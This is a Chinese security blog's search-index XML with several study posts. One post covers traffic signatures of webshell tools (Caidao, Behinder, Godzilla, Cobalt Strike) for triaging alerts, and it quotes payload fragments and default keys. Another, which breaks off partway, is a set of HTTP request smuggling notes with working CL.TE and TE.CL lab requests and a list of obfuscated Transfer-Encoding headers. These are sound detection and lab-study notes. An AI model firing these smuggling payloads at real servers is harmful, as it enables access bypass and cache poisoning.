<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>蓝初流量检测的webshell特征总结和误判思路</title>
      <link href="/2025/05/25/test/"/>
      <url>/2025/05/25/test/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="698d2933315862e7678c5dd1a5f7aee2036d93ce89022cd23cabb8b3a2bcb87c">4630436162ade97ba2718b7d0c4b3b630ef8b034c35893a7afa4c54a5752d90eba191a593f89497fdfca691efaf72d5caa0c664d8e7a85bd833fac72ade59ddbf66b4bdec75a2ed1e83f57bcb279b78c8202c7ce8d3eb34051070935a62ccbf9be563b576fcb19a6e4c095e03496f05d0fec5de7a8af18b78d977beffb6874da4670293f572d11dfa81b48ce6cd0448f0a018d399d177f54eb76d77c6c17f9c36f9f255c3de0f225f9e9c6b4f23d83fc3307cf9be8ef0d2bb8d0474ceec45d7300894f4b8f11650b44ad991ba7d432283fbefe6029b9e47d856da566b3c9916f</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 蓝初 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 蓝初 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>蓝初流量检测的webshell特征总结和误判思路</title>
      <link href="/2025/05/25/%E8%87%AA%E5%B7%B1%E5%81%9A%E7%9A%84%E7%AE%80%E6%B4%81%E6%80%BB%E7%BB%93(webshell%E6%B5%81%E9%87%8F&amp;%E5%88%A4%E6%96%AD%E5%91%8A%E8%AD%A6%E6%98%AF%E5%90%A6%E8%AF%AF%E6%8A%A5%E7%9A%84%E6%80%9D%E8%B7%AF)/"/>
      <url>/2025/05/25/%E8%87%AA%E5%B7%B1%E5%81%9A%E7%9A%84%E7%AE%80%E6%B4%81%E6%80%BB%E7%BB%93(webshell%E6%B5%81%E9%87%8F&amp;%E5%88%A4%E6%96%AD%E5%91%8A%E8%AD%A6%E6%98%AF%E5%90%A6%E8%AF%AF%E6%8A%A5%E7%9A%84%E6%80%9D%E8%B7%AF)/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="antsword"><a href="#antsword" class="headerlink" title="antsword"></a>antsword</h2><p>每个请求体都存在以<code>@ini_set(&quot;display_errors&quot;,&quot;0&quot;);@set_time_limit(0)开头</code></p><p>并且响应体的返回结果是base64编码发混淆字符，格式为：<code>随机数 base64结果 随机数</code></p><h2 id="菜刀"><a href="#菜刀" class="headerlink" title="菜刀"></a>菜刀</h2><ul><li><p>payload在请求体中，采用url编码+base64编码，payload部分是明文传输。</p></li><li><p>payload中有eval或assert、base64_decode这样的字符。</p></li><li><p>payload中有默认固定的&amp;z0&#x3D;QGluaV9zZXQ…这样base64加密的攻击载荷，参数z0对应$_POST[z0]接收到的数据，且固定为QGluaV9zZXQ开头。进行base64解码后可看到代码：@ini_set(“display_errors”,”0”);@set_time_limit(0);@set_magic_quotes_runtime(0);这段意思是首先关闭报错和magic_quotes，接下来去获取主机的信息。</p><p>上面的完整内容是QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtpZihQSFBfVkVSU0lPTjwnNS4zLjAnKXtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO307ZWNobygiWEBZIik7J</p></li></ul><h2 id="冰蝎"><a href="#冰蝎" class="headerlink" title="冰蝎"></a>冰蝎</h2><h3 id="2-0"><a href="#2-0" class="headerlink" title="2.0"></a>2.0</h3><p>先aes加密(cbc模式)然后base64编码</p><p>动态密钥生成</p><p>内置了十几个User-Agent头，每次请求时会随机选择其中的一个</p><h3 id="3-0"><a href="#3-0" class="headerlink" title="3.0"></a>3.0</h3><p>AES加密 + base64编码</p><p>取消了动态密钥生成。在webshell里预留了密钥</p><p>默认的密钥是默认密码(rebeyond)的MD5的前16位</p><p>也就是md5(‘rebeyond’)[0:16]&#x3D;e45e329feb5d925b)</p><p>内置了十几个User-Agent头，每次请求时会随机选择其中的一个</p><p>连接<strong>jsp</strong>的webshell的请求数据包中的content-type字段常见为application&#x2F;octet-stream。</p><h3 id="4-0"><a href="#4-0" class="headerlink" title="4.0"></a>4.0</h3><p>Accept字段（弱特征），通常是Accept: application&#x2F;json, text&#x2F;javascript, <em>&#x2F;</em>; q&#x3D;0.01 意思是浏览器可接受任何文件，但最倾向application&#x2F;json 和 text&#x2F;javascript</p><p>Content-Type字段（弱特征），通常是Content-type: Application&#x2F;x-www-form-urlencoded</p><p>与冰蝎的前述版本相似，进行请求时内置了十几个User-Agent头，每次请求时会随机选择其中的一个。</p><p>连接的端口有一定的特征，冰蝎与webshell建立连接的同时，java也与目的主机建立tcp连接，每次连接使用本地端口在49700左右(就是比较大的端口)，每连接一次，每建立一次新的连接，端口就依次增加。</p><p>使用长连接，避免了频繁的握手造成的资源开销。默认情况下，请求头和响应头里会带有 Connection：Keep-Alive</p><p>有固定的请求头和响应头(弱特征。是因为使用了默认的密钥情况下才有固定的头。如果更改了不使用默认密钥就没有了)，请求字节头：dFAXQV1LORcHRQtLRlwMAhwFTAg&#x2F;M ，响应字节头：TxcWR1NNExZAD0ZaAWMIPAZjH1BFBFtHThcJSlUXWEd</p><p>默认密钥:e45e329feb5d925b</p><h2 id="哥斯拉"><a href="#哥斯拉" class="headerlink" title="哥斯拉"></a>哥斯拉</h2><p>Cookie中有一个非常关键的特征，最后会有个分号</p><p>响应体的数据有一定特征，哥斯拉会把一个32位的md5字符串按照一半拆分，分别放在base64编码的数据的前后两部分。整个响应包的结构体征为：md5前十六位+base64+md5后十六位。</p><p>User-Agent字段（弱特征），如果采用默认的情况，会暴露使用的jdk信息。不过哥斯拉支持自定义HTTP头部，这个默认特征是可以很容易去除的。</p><p>Accept字段（弱特征），默认是<code>Accept:text/html, image/gif, image/jpeg, *; q=.2, /; q=.2。</code>同上，这个也可修改，只能作为辅助检测的特征。</p><p>Accept（弱特征）: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,<em>&#x2F;</em>;q&#x3D;0.8</p><p>payload特征：<br>jsp会出现xc,pass字符和Java反射（ClassLoader，getClass().getClassLoader()），base64加解码等特征<br>php，asp则为普通的一句话木马</p><h2 id="小发现"><a href="#小发现" class="headerlink" title="小发现:"></a>小发现:</h2><h3 id="不是绝对的-也可能是nginx反向代理导致的"><a href="#不是绝对的-也可能是nginx反向代理导致的" class="headerlink" title="(不是绝对的,也可能是nginx反向代理导致的)"></a>(不是绝对的,也可能是nginx反向代理导致的)</h3><p>如果请求头里的HOST头位于比较后的位置。那么要么是冰蝎。要么是哥斯拉。</p><p>因为一般的host头都位于前面的位置</p><p>如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">GET /hackable/uploads/shell.php?pass=852 HTTP/1.1</span><br><span class="line">Content-type: application/x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; InfoPath.3)</span><br><span class="line">Host: 192.168.66.136</span><br><span class="line">Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2</span><br><span class="line">Connection: keep-alive</span><br></pre></td></tr></table></figure><h2 id="区分哥斯拉和冰蝎子的："><a href="#区分哥斯拉和冰蝎子的：" class="headerlink" title="区分哥斯拉和冰蝎子的："></a>区分哥斯拉和冰蝎子的：</h2><p>请求体</p><p>哥斯拉的一般是这两种</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pass=AWEzAAN%2FWFI3XHNGaGBQWDEHPwY4fSQAM2AIDw%3D%3D（base64编码）</span><br><span class="line">或者</span><br><span class="line">​</span><br><span class="line">:•T[6•</span><br><span class="line">L9e•[aqP•)[T\••O9t</span><br><span class="line">这种乱码的</span><br></pre></td></tr></table></figure><p>冰蝎的虽然也是乱码。但是请求的参数好歹还是都是英文字符和数字</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">F1w4ahdSJGUxG3t11sfr6qxbThq9VnL7i6K1/NzHsb0s9eQIfj2qDW/r5OeNJjI0U/BrUp2pHtrtCkdiUeJVIKFzCMSfe8yhEddJFJideje6Eb0dtrHHd9YYaZcxqQL2FFusmCXFICrCh3MsG+BYZHKbNVkWJrsTiu/1VBPV9CBkJzPBO4aH98EBFycyQbpGCHjAPaZmbaIIVWenbm642/xYr85uQ5/K74vlQ9wR5iGLZvyH8WZOF0YpqhxjkApKeShoSGX/C87NiqMTVAB+DcFNf4HaitS1o7Q6kXnUET00L5irn+WdNis2mvNEzr+DGay6LSKKD9kDl6iTKD/1aiXfk5EgH4PfR0/aXCEKTsFW29So6wbhR6u4H3/</span><br></pre></td></tr></table></figure><h2 id="补充：CS-远控码的特征"><a href="#补充：CS-远控码的特征" class="headerlink" title="补充：CS 远控码的特征"></a>补充：CS 远控码的特征</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">端口： 默认 50050 </span><br><span class="line">HTTPS 证书：默认证书中，别名、所有者等信息全是 CobalStrike </span><br><span class="line">UA：默认 CS HTTP 流量的 UA 是 MSIE </span><br><span class="line">Beacon： CS 上线时会先投递一个小 stage ，然后去 beacon server 下载 stage，通过访问默</span><br><span class="line">认的 uri 获取 cs 的 shellcode，从而识别到 cs beacon stagin 的特征。</span><br><span class="line">心跳包特征 a) 间隔一定时间，均有通信，且流级上的上下行数据长度固定；</span><br><span class="line">数据特征a) 在请求的返回包中，通信数据均隐藏在jqeury*.js中。</span><br></pre></td></tr></table></figure><h2 id="是否为误判的判断处理"><a href="#是否为误判的判断处理" class="headerlink" title="是否为误判的判断处理:"></a>是否为误判的判断处理:</h2><h3 id="判断冰蝎（Cobalt-Strike）或哥斯拉（Godzilla）告警是否为误报的具体步骤"><a href="#判断冰蝎（Cobalt-Strike）或哥斯拉（Godzilla）告警是否为误报的具体步骤" class="headerlink" title="判断冰蝎（Cobalt Strike）或哥斯拉（Godzilla）告警是否为误报的具体步骤"></a><strong>判断冰蝎（Cobalt Strike）或哥斯拉（Godzilla）告警是否为误报的具体步骤</strong></h3><h3 id="个人理解-补充"><a href="#个人理解-补充" class="headerlink" title="个人理解:补充:"></a><strong>个人理解:补充:</strong></h3><p><strong>只需要判断到底是不是webshell木马的流量就行,如果存在明显的弱特征符合并且正常的请求头里一定不可能存在这种形式的弱特征那么基本就不是误报,如果攻击者对这方面做得很好,判断不出来就需要分析前后的包然后查看响应内容拿密钥解密什么的看看关键词什么的是否为恶意(可能存在那种刚好的正常的业务也存在相同参数的情况,所以需要尝试用key看看能不能解密响应之类的,或者看看正常的这块业务的代码是否存在这个参数去判断是否为误报),或者查看前后是否存在短时间高频率且异常路径的请求包和响应之类的</strong></p><p>判断是否为误报时，</p><p><strong>第一步</strong>:应检查是否存在典型的 Webshell 请求特征，而不是一开始就追踪执行行为。</p><p>比如哥斯拉的cookie是多了个分号</p><p>哥斯拉的UA头里存在jdk版本</p><p>更多的弱特征看上文</p><p>这种正常的请求里决不可能存在的如果出现那么就是webshell流量,没有误判</p><p>不管payload里面写了什么还是测试的语句了,至少没有问题不是误报.确定为webshell流量</p><p>所有的正常的请求头一般host请求头都是放在第二个位置,</p><p>但是webshell的流量的请求头host都是放在比较后面的在请求包里</p><p>HOST请求头在UA之后之类的</p><p><strong>可以直接通过第一步判断是最好的,但是如果不行就去通过第二步尝试判断:</strong></p><p><strong>第二步:</strong></p><h5 id="高隐蔽哥斯拉流量"><a href="#高隐蔽哥斯拉流量" class="headerlink" title="高隐蔽哥斯拉流量"></a><strong>高隐蔽哥斯拉流量</strong></h5><ul><li><strong>现象</strong>：攻击者删除分号，UA伪装为Chrome，但请求体含<code>pass=xxx</code>。</li><li><strong>判定</strong>：<ul><li>解密<code>pass</code>参数，发现<code>Runtime.exec(&quot;curl http://恶意IP&quot;)</code>，确认攻击。</li><li><strong>可能存在那种刚好的正常的业务也存在相同参数的情况,所以需要尝试用key看看能不能解密响应之类的</strong></li><li><strong>或者看看正常的这块业务的代码是否存在这个参数去判断是否为误报</strong></li></ul></li></ul><p><strong>第三步:</strong></p><p>时间与频率：攻击流量通常高频、短时触发。</p><p>查看url路径是否存在关联</p><ul><li>若告警URL为业务无关路径（如<code>/upload/xxx.jsp</code>），风险较高；  </li><li>若为正常业务接口（如<code>/api/login</code>），需结合参数进一步判断。</li></ul><hr><h4 id="1-提取告警流量特征"><a href="#1-提取告警流量特征" class="headerlink" title="1. 提取告警流量特征"></a><strong>1. 提取告警流量特征</strong></h4><ul><li><strong>请求&#x2F;响应头检查</strong>：  <ul><li><strong>User-Agent</strong>：冰蝎默认UA可能为<code>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36</code>，哥斯拉可能为空或自定义UA。  </li><li><strong>Cookie</strong>：哥斯拉Cookie中通常包含<code>;</code>分隔的Base64字段（如<code>rememberMe=xxx; PHPSESSID=xxx</code>），冰蝎可能使用固定Cookie名（如<code>SessionID</code>）。</li></ul></li><li><strong>URL路径</strong>：  <ul><li>冰蝎默认路径如<code>/submit.php</code>、<code>/gate.php</code>；哥斯拉可能使用<code>/admin/login.php</code>等伪装路径。</li></ul></li></ul><hr><h4 id="2-分析请求体与响应体"><a href="#2-分析请求体与响应体" class="headerlink" title="2. 分析请求体与响应体"></a><strong>2. 分析请求体与响应体</strong></h4><ul><li><strong>参数特征</strong>：  <ul><li>哥斯拉：参数名可能为<code>pass</code>、<code>data</code>，值为Base64+AES加密数据；冰蝎常用<code>cmd</code>、<code>id</code>等参数，加密数据长度固定。  </li><li>检查是否存在<strong>长Base64字符串</strong>或<strong>无意义二进制数据</strong>。</li></ul></li><li><strong>响应特征</strong>：  <ul><li>哥斯拉：返回内容可能含<code>pageContext</code>、<code>ClassLoader</code>等Java反射关键词；  </li><li>冰蝎：返回数据可能为加密后的二进制格式（如Beacon心跳包）。</li></ul></li></ul><hr><h4 id="3-解密验证（关键步骤）"><a href="#3-解密验证（关键步骤）" class="headerlink" title="3. 解密验证（关键步骤）"></a><strong>3. 解密验证（关键步骤）</strong></h4><ul><li><strong>哥斯拉</strong>：  <ol><li>提取请求中的<code>pass</code>参数值（密钥），尝试用AES解密Base64数据。  </li><li>若解密后含<code>Runtime.getRuntime().exec()</code>或文件操作命令（如<code>whoami</code>），则为真实攻击。</li></ol></li><li><strong>冰蝎</strong>：  <ol><li>检查流量是否使用SSL，提取JA3指纹（冰蝎默认JA3指纹可匹配）。  </li><li>若为HTTP，尝试解密数据（默认密钥为<code>Tk5UU1NM</code>），查看是否含Beacon配置信息。</li></ol></li></ul><hr><h4 id="4-上下文关联分析"><a href="#4-上下文关联分析" class="headerlink" title="4. 上下文关联分析"></a><strong>4. 上下文关联分析</strong></h4><ul><li><strong>时间与频率</strong>：  <ul><li>攻击流量通常集中在短时间内高频触发（如1分钟内多次POST请求）。</li></ul></li><li><strong>业务场景</strong>：  <ul><li>若告警URL为业务无关路径（如<code>/upload/xxx.jsp</code>），风险较高；  </li><li>若为正常业务接口（如<code>/api/login</code>），需结合参数进一步判断。</li></ul></li></ul><hr><h4 id="5-日志与行为溯源"><a href="#5-日志与行为溯源" class="headerlink" title="5. 日志与行为溯源"></a><strong>5. 日志与行为溯源</strong></h4><ul><li><strong>服务器日志</strong>：  <ul><li>检查对应IP的访问记录，确认是否在告警时间点有异常文件创建（如<code>webshell.jsp</code>）。</li></ul></li><li><strong>文件监控</strong>：  <ul><li>若上传路径存在可疑文件（如<code>.jsp</code>、<code>.php</code>），结合文件哈希与威胁情报匹配。</li></ul></li></ul><hr><h4 id="6-误报可能性排查"><a href="#6-误报可能性排查" class="headerlink" title="6. 误报可能性排查"></a><strong>6. 误报可能性排查</strong></h4><ul><li><strong>加密业务流量</strong>：  <ul><li>部分业务系统使用AES加密传输数据（如医疗、金融），需与开发确认是否合法。</li></ul></li><li><strong>扫描器干扰</strong>：  <ul><li>安全扫描器（如AWVS、Nessus）可能触发类似特征，需对比扫描任务时间线。</li></ul></li></ul><hr><h3 id="总结判断流程图"><a href="#总结判断流程图" class="headerlink" title="总结判断流程图"></a><strong>总结判断流程图</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">告警触发 → 提取特征（UA/URL/参数） → 匹配已知工具特征  </span><br><span class="line">   ↓                            ↓  </span><br><span class="line">是 → 解密验证恶意指令 → 确认攻击  </span><br><span class="line">   ↓                            ↓  </span><br><span class="line">否 → 检查业务合理性 → 关联日志/文件 → 判定误报  </span><br></pre></td></tr></table></figure><hr><h3 id="示例误报场景"><a href="#示例误报场景" class="headerlink" title="示例误报场景"></a><strong>示例误报场景</strong></h3><ul><li><strong>哥斯拉误报</strong>：某系统使用Base64加密传输业务数据，但无<code>pass</code>参数或反射关键字。  </li><li><strong>冰蝎误报</strong>：内部工具使用固定Cookie名<code>SessionID</code>，但未加密且无Beacon行为。</li></ul><p>通过以上步骤，可系统化区分真实攻击与误报，提升告警分析效率。</p>]]></content>
      
      
      <categories>
          
          <category> 蓝初 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 蓝初 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>请求走私笔记(HTTP/2降级,绕过clte,请求隧道,响应投毒,缓存投毒,缓存欺骗)</title>
      <link href="/2025/05/25/%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E7%AC%94%E8%AE%B0%E4%BC%98%E5%8C%96/"/>
      <url>/2025/05/25/%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E7%AC%94%E8%AE%B0%E4%BC%98%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="笔记"><a href="#笔记" class="headerlink" title="笔记:"></a>笔记:</h2><h3 id="必要条件"><a href="#必要条件" class="headerlink" title="必要条件"></a><strong>必要条件</strong></h3><h4 id="1-存在请求转发链"><a href="#1-存在请求转发链" class="headerlink" title="1. 存在请求转发链"></a>1. <strong>存在请求转发链</strong></h4><ul><li><strong>典型场景</strong>：<code>客户端 → 前端服务器（反向代理/负载均衡）→ 后端服务器</code></li><li><strong>差异性</strong>：前端与后端服务器对 HTTP 请求的解析逻辑不一致。</li></ul><h4 id="2-协议解析差异"><a href="#2-协议解析差异" class="headerlink" title="2. 协议解析差异"></a>2. <strong>协议解析差异</strong></h4><ul><li>前端（如反向代理）与后端服务器对 <code>Content-Length</code>（CL）或 <code>Transfer-Encoding</code>（TE）标头的处理方式不同。<ul><li><strong>CL.TE 走私</strong>：前端用 <code>Content-Length</code> 解析，后端用 <code>Transfer-Encoding</code> 解析。</li><li><strong>TE.CL 走私</strong>：前端用 <code>Transfer-Encoding</code> 解析，后端用 <code>Content-Length</code> 解析。</li><li><strong>TE.TE 走私</strong>：前后端均支持 <code>Transfer-Encoding</code>，但对标头值的处理不一致（如大小写、非法字符）。</li></ul></li></ul><h4 id="3-连接复用（Keep-Alive）"><a href="#3-连接复用（Keep-Alive）" class="headerlink" title="3. 连接复用（Keep-Alive）"></a>3. <strong>连接复用（Keep-Alive）</strong></h4><p><strong>“连接复用”特指前端服务器和后端服务器之间的TCP连接复用</strong>,而不是用户和前端服务器或者攻击者和前端服务器的复用连接</p><p>后端服务器必须复用 TCP 连接处理多个请求，否则走私的请求片段无法被后续请求捕获。</p><h4 id="4-非法请求构造可行性"><a href="#4-非法请求构造可行性" class="headerlink" title="4. 非法请求构造可行性"></a>4. <strong>非法请求构造可行性</strong></h4><ul><li>攻击者能构造包含歧义边界的请求：<ul><li>同时包含 <code>Content-Length</code> 和 <code>Transfer-Encoding</code> 标头。</li><li>使用非规范化的标头值（如畸形的块长度、多个 <code>Content-Length</code> 头）。</li></ul></li><li>前端服务器未对非法请求进行规范化或拦截。</li></ul><p>存在请求走私的环境要求:HTTP&#x2F;1.1</p><p>如果只有HTTP&#x2F;2是不行的</p><p>但是如果前端服务器会把HTTP&#x2F;2进行降级那么也可能存在请求走私</p><h3 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项:"></a>注意事项:</h3><p>注意cl是否需要被自动更新</p><p>换行是\r\n在包里占两个字节也会计算在cl里</p><p><strong>第一个请求走私的污染包</strong></p><p><strong>路径最好不要只写&#x2F;根路径</strong></p><p>带点文件的路径拿过来更好打请求走私</p><p>不然有的时候会打不上去</p><p>比如这样</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">POST /resources/images/blog.svg HTTP/1.1(注意如果这里的/resources/images/blog.svg变成/可能会失效)</span><br><span class="line">Host: 0a6600af0319bf3080aa943600c700d0.web-security-academy.net</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Cookie: session=azgRVA1fAluAtG2RSZMz6OvxCYYrs3yo</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 34</span><br><span class="line">Connection: closed</span><br><span class="line"></span><br><span class="line">GET /admins HTTP/1.1</span><br><span class="line">Foo: x</span><br></pre></td></tr></table></figure><h3 id="在有混淆的请求解析差异的基础上可以总结出这样的请求走私打法规则"><a href="#在有混淆的请求解析差异的基础上可以总结出这样的请求走私打法规则" class="headerlink" title="在有混淆的请求解析差异的基础上可以总结出这样的请求走私打法规则:"></a>在有混淆的请求解析差异的基础上可以总结出这样的请求走私打法规则:</h3><p>这个适用于适用于clte tecl clcl tete有协议解析差异的情况下</p><p>cl限制往小了写是让下面的多出来的字符做第二个请求。往大了写能拿来打延时判断存在<br>te下面0后面接字符是作为第二个请求。但是没写结束符0则是可以拿来打延时</p><p><strong>上面这条规则适用于存在混淆边界(也就是存在协议解析差异)的情况下</strong></p><h2 id="困惑"><a href="#困惑" class="headerlink" title="困惑:"></a>困惑:</h2><p><strong>在不存在协议解析的差异的情况下为什么上面这条规则行不通了?不理解…..有大佬看到的话希望能解答解答教教我</strong></p><p><strong>qq:1512624649</strong> </p><p><strong>这条规则是从cl和te的解析逻辑上推出来的.可是为什么没有协议解析差异就行不通了???</strong></p><p>是因为RFC吗?但是tete靶场里明明没有严格遵循RFC好像也是不行</p><p>不理解┭┮﹏┭┮</p><p>ai说这样可以形成一种只对自己的下一次请求的污染?对别人不行.但我一直用tete靶场打的时候当我不对请求解析混淆的时候一直测不出来对自己的第二个请求的污染.这个观点存疑</p><h4 id="其他使用技巧注意事项"><a href="#其他使用技巧注意事项" class="headerlink" title="其他使用技巧注意事项:"></a>其他使用技巧注意事项:</h4><p>要注意HTTP&#x2F;1.1如果默认支持HTTP&#x2F;2的话默认会优先http&#x2F;2</p><p>响应如果说请求头重复</p><p>一般是Host头重复了和正常的请求</p><p>正常的请求头是无法改变的.我们只好把第二个我们尝试污染的请求头里Host删除掉就可以了</p><h3 id="到底什么是请求解析差异"><a href="#到底什么是请求解析差异" class="headerlink" title="到底什么是请求解析差异?"></a>到底什么是请求解析差异?</h3><h3 id="各种类型的混淆请求解析差异类型"><a href="#各种类型的混淆请求解析差异类型" class="headerlink" title="各种类型的混淆请求解析差异类型:"></a>各种类型的混淆请求解析差异类型:</h3><h4 id="clte-tecl的混淆方式"><a href="#clte-tecl的混淆方式" class="headerlink" title="clte tecl的混淆方式"></a>clte tecl的混淆方式</h4><p>这里做个简单的举例</p><p>比如clte tecl这两种它本身存在两种请求解析</p><p>一种是<code>Content-Length</code>,一种是Transfer-Encoding</p><p>当两者共同存在的时候他们的请求解析就是混淆的</p><p>所以支持,然后根据前后端对这个不同的处理方式形成请求走私</p><p><strong>这是portswigger的靶场cl.te包:</strong></p><p>第二个Content-Length: 2的作用是为了让第二个变成完整的请求</p><p>这样的话头就不会重复不然会跟原先的Host头重复报错</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: 0a5300d503627e4d8187481200f600f4.web-security-academy.net</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 151</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">GET /admin/delete?username=carlos HTTP/1.1</span><br><span class="line">Host: localhost</span><br><span class="line">X-Ignore: X</span><br><span class="line">Content-Length: 2</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">12</span><br></pre></td></tr></table></figure><p><strong>te.cl</strong>:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: 0a66004b030827208077262e00bc0087.web-security-academy.net</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 4</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">5a</span><br><span class="line">GPOST / HTTP/1.1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 15</span><br><span class="line"></span><br><span class="line">x</span><br><span class="line">0</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="tete的混淆方式"><a href="#tete的混淆方式" class="headerlink" title="tete的混淆方式"></a>tete的混淆方式</h4><p>虽然前后端解析都是te.但是请求头里仍然要存在cl字段并且正常使用就行.也就是让bp自动update他的字符个数即可</p><p>混淆标头的方法是参考参数污染的方式构造多个<code>Transfer-Encoding</code>请求头，例如：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Transfer</span>-<span class="title class_">Encoding</span>: xchunked</span><br><span class="line"><span class="title class_">Transfer</span>-<span class="title class_">Encoding</span> : chunked</span><br><span class="line"><span class="title class_">Transfer</span>-<span class="title class_">Encoding</span>: chunked</span><br><span class="line"><span class="title class_">Transfer</span>-<span class="title class_">Encoding</span>: x</span><br><span class="line"><span class="title class_">Transfer</span>-<span class="title class_">Encoding</span>:[tab]chunked</span><br><span class="line">[space]<span class="title class_">Transfer</span>-<span class="title class_">Encoding</span>: chunked</span><br><span class="line"><span class="attr">X</span>: X[\n]<span class="title class_">Transfer</span>-<span class="title class_">Encoding</span>: chunked</span><br><span class="line"><span class="title class_">Transfer</span>-<span class="title class_">Encoding</span></span><br><span class="line">: chunked</span><br></pre></td></tr></table></figure><p>混淆的标头要放在正常的te请求头前面才可以</p><p>这样可以导致错误的标头被前后端形成不同的处理</p><p>放在后面就会导致混淆失败</p><p>比如这样</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 